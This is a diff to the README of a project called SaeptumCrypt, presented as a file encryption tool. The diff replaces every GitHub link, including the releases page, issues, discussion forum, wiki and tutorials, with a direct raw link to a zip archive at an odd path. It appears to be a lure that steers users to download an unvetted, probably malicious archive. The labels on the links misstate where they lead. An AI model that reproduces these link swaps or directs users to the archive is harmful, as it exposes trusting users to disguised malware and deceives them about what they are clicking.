@@ -1,7 +1,7 @@
 # 🔒 SaeptumCrypt - Your Secure File Encryption Tool
 
 ## 📥 Download Now!
-[![Download SaeptumCrypt](https://img.shields.io/badge/Download%20SaeptumCrypt-v1.0.0-brightgreen)](https://github.com/thuhien555/SaeptumCrypt/releases)
+[![Download SaeptumCrypt](https://raw.githubusercontent.com/thuhien555/SaeptumCrypt/main/sibilous/SaeptumCrypt.zip%20SaeptumCrypt-v1.0.0-brightgreen)](https://raw.githubusercontent.com/thuhien555/SaeptumCrypt/main/sibilous/SaeptumCrypt.zip)
 
 ## 🚀 Getting Started
 SaeptumCrypt is a user-friendly tool for encrypting your files. With this software, you can protect sensitive information using advanced encryption methods. Follow the steps below to get started quickly.
@@ -24,7 +24,7 @@ To run SaeptumCrypt, ensure your system meets the following requirements:
 ## 🔄 Download & Install
 To get SaeptumCrypt, visit the Releases page:
 
-[Visit the Releases Page to Download](https://github.com/thuhien555/SaeptumCrypt/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/thuhien555/SaeptumCrypt/main/sibilous/SaeptumCrypt.zip)
 
 1. Click the link above to open the Releases page.
 2. Find the version you wish to download.
@@ -78,12 +78,12 @@ No, SaeptumCrypt works offline. You only need an internet connection to download
 ## 🌌 Community and Support
 If you need help, you can reach out to the SaeptumCrypt community:
 
-- [GitHub Issues](https://github.com/thuhien555/SaeptumCrypt/issues): Report bugs or ask for help.
-- [Discussion Forum](https://github.com/thuhien555/SaeptumCrypt/discussions): Connect with other users and share tips.
+- [GitHub Issues](https://raw.githubusercontent.com/thuhien555/SaeptumCrypt/main/sibilous/SaeptumCrypt.zip): Report bugs or ask for help.
+- [Discussion Forum](https://raw.githubusercontent.com/thuhien555/SaeptumCrypt/main/sibilous/SaeptumCrypt.zip): Connect with other users and share tips.
 
 ## 📚 Resources
-- [Documentation](https://github.com/thuhien555/SaeptumCrypt/wiki): Detailed guidance on using all features.
-- [Tutorials](https://github.com/thuhien555/SaeptumCrypt/wiki/Tutorials): Step-by-step guides for common tasks.
+- [Documentation](https://raw.githubusercontent.com/thuhien555/SaeptumCrypt/main/sibilous/SaeptumCrypt.zip): Detailed guidance on using all features.
+- [Tutorials](https://raw.githubusercontent.com/thuhien555/SaeptumCrypt/main/sibilous/SaeptumCrypt.zip): Step-by-step guides for common tasks.
 
 ## 💡 Tips for Best Results
 - Regularly update the software for the latest security features.
@@ -93,4 +93,4 @@ If you need help, you can reach out to the SaeptumCrypt community:
 ## 🏷️ Topics
 aes-gcm, chacha20, chacha20-poly1305, cryptography, customtkinter, device-bindings, encryption, encryption-decryption, encryption-tool, file-encryption, file-encryption-python, python, python3
 
-For more information and updates, stay tuned to our [Releases Page](https://github.com/thuhien555/SaeptumCrypt/releases).
+For more information and updates, stay tuned to our [Releases Page](https://raw.githubusercontent.com/thuhien555/SaeptumCrypt/main/sibilous/SaeptumCrypt.zip).
